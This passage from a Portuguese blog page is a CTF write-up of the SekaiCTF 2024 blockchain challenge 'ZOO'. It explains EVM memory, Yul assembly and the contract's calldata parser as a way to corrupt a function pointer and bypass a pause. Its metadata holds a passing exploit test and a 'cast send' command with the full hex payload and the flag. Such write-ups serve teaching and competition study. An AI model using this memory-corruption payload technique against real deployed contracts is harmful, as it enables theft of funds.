queríamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ forge test -vv [⠊] Compiling... No files changed, compilation skipped Ran 1 test for test/ZOO.t.sol:ZOOTest [PASS] test_bypass_pause() (gas: 458630) Logs: Success Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.03ms (297.42µs CPU time) Ran 1 test suite in 5.17ms (1.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) Na hora de resolver o chall no CTF de verdade, podemos usar o cast send pra mandar nosso payload como calldata.\n1 cast send --rpc-url $rpc --private-key $private $zoo 0x1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323 Flag: SEKAI{super-duper-memory-master-:3}\n","wordCount":"5063","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-09-02T00:00:00Z","dateModified":"2024-09-02T00:00:00Z","author":{"@type":"Person","name":"ottoboni"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/2024-08-25-sekaictf-zoo/"},"publisher":{"@type":"Organization","name":"Blog do GRIS","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=Categorias><span>Categorias</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://www.youtube.com/@grisufrj title=Youtube><span>Youtube</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">SekaiCTF 2024 writeup: Blockchain/ZOO</h1><div class=post-description>Writeup de um desafio de blockchain do SekaiCTF 2024.</div><div class=post-meta><span title='2024-09-02 00:00:00 +0000 UTC'>September 2, 2024</span>&nbsp;·&nbsp;24 min&nbsp;·&nbsp;5063 words&nbsp;·&nbsp;ottoboni&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/blog/2024-08-25-sekaictf-zoo.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h1 id=o-desafio>O desafio<a hidden class=anchor aria-hidden=true href=#o-desafio>#</a></h1><ul><li>Autor: snwo</li><li>Descrição: <em>Welcome to assembly zoo</em></li></ul><h1 id=análise-inicial>Análise inicial<a hidden class=anchor aria-hidden=true href=#análise-inicial>#</a></h1><p>Dando uma olhada no contrato de setup,
vemos que o objetivo final é
setar a variável <code>isSolved</code> no contrato <code>ZOO</code> para <code>1</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>contract</span> <span class=n>Setup</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ZOO</span> <span class=n>public</span> <span class=n>immutable</span> <span class=n>zoo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>constructor</span><span class=p>()</span> <span class=n>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>zoo</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ZOO</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>isSolved</span><span class=p>()</span> <span class=n>public</span> <span class=n>view</span> <span class=n>returns</span> <span class=p>(</span><span class=ne>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>zoo</span><span class=o>.</span><span class=n>isSolved</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Logo de cara,
<code>ZOO</code> tem alguns pontos interessantes.
Esse contrato implementa <code>Pausable</code>
e chama a função <code>_pause</code> no final do construtor.
Usando a <a href=https://docs.openzeppelin.com/contracts/4.x/api/security#Pausable>documentação</a>,
vemos que isso é um mecanismos pra habilitar/desabilitar funções do contrato.
Quando pausado,
funções marcadas com o modificador <code>whenNotPaused</code>
chamam <code>revert</code> ao serem chamadas.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>import</span> <span class=p>{</span><span class=n>Animal</span><span class=p>}</span> <span class=n>from</span> <span class=s2>&#34;./Animal.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=p>{</span><span class=n>Pausable</span><span class=p>}</span> <span class=n>from</span> <span class=s2>&#34;@openzeppelin/contracts/utils/Pausable.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>contract</span> <span class=n>ZOO</span> <span class=n>is</span> <span class=n>Pausable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint256</span> <span class=n>public</span> <span class=n>isSolved</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>AnimalWrapper</span><span class=p>[]</span> <span class=n>public</span> <span class=n>animals</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>constructor</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=n>The</span> <span class=n>ZOO</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>opened</span> <span class=n>yet</span> <span class=p>:(</span>
</span></span><span class=line><span class=cl>        <span class=n>_pause</span><span class=p>();</span>   
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Seguindo a diante,
esbarramos na função <code>commit</code>,
que usa esse modificador.
Essa função também tem a peculiaridade
de ser escrita completamente em assembly.
Ok&mldr;
Vamos ignorar ela por enquanto,
mas aparentemente a gente tem que despausar o contrato pra chegar nela.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function commit(bytes memory data) internal whenNotPaused {
</span></span><span class=line><span class=cl>    assembly {
</span></span><span class=line><span class=cl>        &lt;snip&gt;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Por fim,
temos uma função <code>fallback</code>.
Essa função é especial (por isso não precisa da keyword <code>function</code>)
e é chamada quando a assinatura especificada no calldata não existe.
Basicamente, é a função que é chamada quando você chama uma função que não existe.
Pra nossa infelicidade,
basicamente tudo é escrito em assembly,
e não é pouco código não.
Vamos analisar o que não está em assembly então:</p><ol><li>A função aceita <code>bytes</code> como argumento.
Esses bytes são <a href=https://solidity-by-example.org/fallback/>na verdade a calldata</a> enviada para a função.</li><li>Temos um array de <code>function(bytes memory)</code> chamado <code>functions</code>.</li><li>O único elemento desse array é a função <code>commit</code> que vimos antes.</li><li><code>commit</code> é então chamada <em>a partir desse array</em> no final da função</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>fallback() external payable {
</span></span><span class=line><span class=cl>    function(bytes memory)[] memory functions = new function(
</span></span><span class=line><span class=cl>        bytes memory
</span></span><span class=line><span class=cl>    )[](1);
</span></span><span class=line><span class=cl>    functions[0] = commit;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    bytes memory local_animals;
</span></span><span class=line><span class=cl>    assembly {
</span></span><span class=line><span class=cl>        &lt;snip&gt;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    functions[0](local_animals);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Se você já tem alguma experiência com desafios de pwn,
esse array <code>functions</code> tá quase que gritando
&ldquo;ME CORROMPA POR FAVOR&rdquo;.
A única razão lógica pra
chamar a função usando o array é
justamente pra você conseguir corromper o endereço.
O código não foi escrito assim por acaso.
O fato de o que vem logo depois estar em assembly
(único lugar que bugs de memória podem acontecer em Solidity)
só enfatiza isso.
Nesse contexto,
sem nem ler o assembly nem nada,
o caminho já tá mais ou menos claro:
<strong>deve ter algum bug no assembly que me permite sobrescrever o array</strong>.
Sobrescrevendo o array,
a gente provavelmente consegue pular direto pra <code>commit</code>
e bypassar o <code>whenNotPaused</code>.
O que a gente faz quando chegar lá?
Menor ideia,
um problema de cada vez.</p><p>Dito isso,
hora de sofrer tentando entender o assembly.
Mas, antes disso,
vamos entender um pouco sobre como assembly em Solidity funciona.</p><h1 id=yul>Yul<a hidden class=anchor aria-hidden=true href=#yul>#</a></h1><p>Todo código que roda na Ethereum Virtual Machine (EVM)
tem que ser compilado para bytecode da EVM.
Como o nome diz,
a EVM é uma máquina virtual
e tem sua própria arquitetura,
exatamente como x86 e ARM.
Como toda arquitetura,
a EVM tem instruções e
essas instruções podem
ser representadas mais facilmente a partir de assembly.
Uma curiosidade interessante
é que todos os <a href=https://www.evm.codes/>opcodes da EVM</a> ocupam exatamente 1 byte.
Elegante, né?</p><p>Bom, você pode escrever código pra EVM
instrução por instrução,
mas felizmente isso não é necessário.
Esses blocos <code>assembly</code> usados em Solidity
na verdade aceitam uma linguagem chamada <a href=https://docs.soliditylang.org/en/latest/yul.html>Yul</a>,
que é tipo um assembly turbinado.
Em Yul,
você chama as instruções normalmente,
mas também existem loops, condicionais e variáveis.
Isso facilita bastante e
meio que abstrai a arquitetura de pilha da EVM.
Você ainda consegue acessar as instruções diretamente,
mas aquela parte mais chata e repetitiva de escrever assembly é feita pra você.</p><h1 id=como-funciona-a-memória-de-um-contrato-na-evm>Como funciona a memória de um contrato na EVM<a hidden class=anchor aria-hidden=true href=#como-funciona-a-memória-de-um-contrato-na-evm>#</a></h1><p>Primeiro de tudo,
um ponto super importante:
<strong>a EVM é uma máquina de 256 bits</strong>.
Sendo assim,
a stack tem entradas de 32 bytes e
os endereços ocupam 32 bytes.
Não é à toa que
<code>uint</code> e <code>uint256</code> são sinônimos em Solidity:
basicamente tudo é feito de 32 em 32 bytes.</p><p>Outro fato interessante é que
a memória de um contrato começa em 0.
Conforme o contrato vai usando memória,
ela vai sendo expandida
(e isso custa gas).</p><p>Temos também que
as quatro primeiras words (word = 32 bytes)
são reservadas e têm usos específicos.
Nessa lógica,
o espaço livre pro contrato fazer o que quiser
começa em <code>0x80</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x00 -&gt; scratch
</span></span><span class=line><span class=cl>0x20 -&gt; scratch
</span></span><span class=line><span class=cl>0x40 -&gt; free memory pointer
</span></span><span class=line><span class=cl>0x60 -&gt; zero
</span></span></code></pre></td></tr></table></div></div><p>Dessas words reservadas,
a mais importante é a terceira (fica em <code>0x40</code>).
Nesse espaço fica o <strong>free memory pointer</strong>.
Esse ponteiro aponta pra onde tem memória livre.
Dessa forma,
sempre que o programa precisa armazenar alguma coisa na memória,
ele armazena no local onde esse ponteiro aponta
e então move o ponteiro adiante pra algum lugar livre.</p><p>Com todo esse contexto explicado,
vamos partir pra análise do assembly.</p><h1 id=a-função-fallback>A função fallback<a hidden class=anchor aria-hidden=true href=#a-função-fallback>#</a></h1><p>Primeiro a função usa <code>mload</code>
pra pegar um endereço disponível no free memory pointer.
Em seguida,
armazena o tamanho e o conteúdo da calldata nesse espaço.
Lembrando aqui que a calldata nesse contexto
é exatamente a mesma coisa que o argumento passado pra função.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>//</span> <span class=n>armazena</span> <span class=n>calldatasize</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>arr</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>size</span> <span class=p>:</span><span class=o>=</span> <span class=n>calldatasize</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>move</span> <span class=n>e</span> <span class=n>alinha</span> <span class=n>free</span> <span class=n>memory</span> <span class=n>pointer</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>size_align</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>sub</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=n>mod</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>))),</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=n>size_align</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span>  <span class=n>armazena</span> <span class=n>calldata</span>
</span></span><span class=line><span class=cl><span class=n>calldatacopy</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Em seguida,
aquela variável de fora do assembly, <code>local_animals</code>,
é alocada em um espaço de <code>0x120</code> bytes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>local_animals</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>add</span><span class=p>(</span><span class=n>local_animals</span><span class=p>,</span> <span class=mh>0x120</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>Temos então um loop pra iterar
cada byte da calldata.
Em seguida,
o primeiro byte da calldata é lido e salvo em <code>op</code>.
Essa sequência de <code>mload shr add</code>
vai se repetir bastante.</p><p>A variável <code>op</code> é então usada em um <code>switch</code>.
Com isso,
podemos ver que o que o assembly faz é basicamente
ler instruções passadas via calldata,
sendo o primeiro byte
qual instrução queremos chamar.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>for</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>lt</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>op</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>op</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=n>op</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=n>op</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x10</span> <span class=p>{</span> <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x20</span> <span class=p>{</span> <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x30</span> <span class=p>{</span> <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=p>{</span>
</span></span></code></pre></td></tr></table></div></div><p>Vamos analisar em seguida
as operações <code>0x10</code> e <code>0x20</code>.
A <code>0x30</code> será ignorada
porque não foi usada na solução desse chall.
Ainda assim,
foram postadas soluções diferentes no Discord do CTF
que usam essa instrução.</p><h2 id=operação-0x10---add-animal>Operação 0x10 - Add animal<a hidden class=anchor aria-hidden=true href=#operação-0x10---add-animal>#</a></h2><p>O próximo byte da calldata é armazenado em <code>idx</code>.
Pelo nome,
já vemos que isso vai ser um índice.
Em seguida,
o código checa se o índice é maior que 7.
Se for,
a transação falha.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>idx</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>gt</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=mi>7</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>revert</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Os próximos 4 bytes
são pra <code>name_length</code> e <code>animal_index</code>,
cada um com 2 bytes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf0</span><span class=p>,</span> <span class=n>name_length</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>animal_index</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>animal_index</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf0</span><span class=p>,</span> <span class=n>animal_index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>O código segue pra alocar um espaço e o chama de <code>temp</code>.
Na primeira word,
<code>animal_index</code> é armazenado.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>temp</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span> <span class=n>animal_index</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Temos em seguida um <code>mcopy</code>
que copia os próximos <code>name_length</code> bytes da calldata
pra terceira word de <code>temp</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mcopy(add(temp, 0x40), add(add(arr, 0x20), i), name_length)
</span></span><span class=line><span class=cl>i := add(i, name_length)
</span></span></code></pre></td></tr></table></div></div><p>O valor em <code>name_length</code> é então alinhado
e armazenado na segunda word de <code>temp</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>name_length := add(
</span></span><span class=line><span class=cl>    name_length,
</span></span><span class=line><span class=cl>    sub(0x20, mod(name_length, 0x20))
</span></span><span class=line><span class=cl>)
</span></span><span class=line><span class=cl>mstore(add(temp, 0x20), name_length)
</span></span></code></pre></td></tr></table></div></div><p>Agora que <code>animal_index</code>, <code>name_length</code> e <code>name</code> foram escritos na memória,
o free memory pointer é atualizado pra apontar pra logo depois deles.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mstore(0x40, add(temp, add(name_length, 0x40)))
</span></span></code></pre></td></tr></table></div></div><p>O endereço de temp segue para ser armazenado
em <code>(local_animals + 0x20) + (idx * 0x20)</code>.
Com isso, vemos que <code>local_animals</code>
é na verdade um array,
com o endereço de seus elementos começando em <code>+ 0x20</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mstore(add(add(local_animals, 0x20), mul(0x20, idx)), temp)
</span></span></code></pre></td></tr></table></div></div><p>Por fim,
vemos que a primeira word de <code>local_animals</code>
é o tamanho do array.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>animals_count</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>local_animals</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=n>local_animals</span><span class=p>,</span> <span class=n>add</span><span class=p>(</span><span class=n>animals_count</span><span class=p>,</span> <span class=mi>1</span><span class=p>))</span>
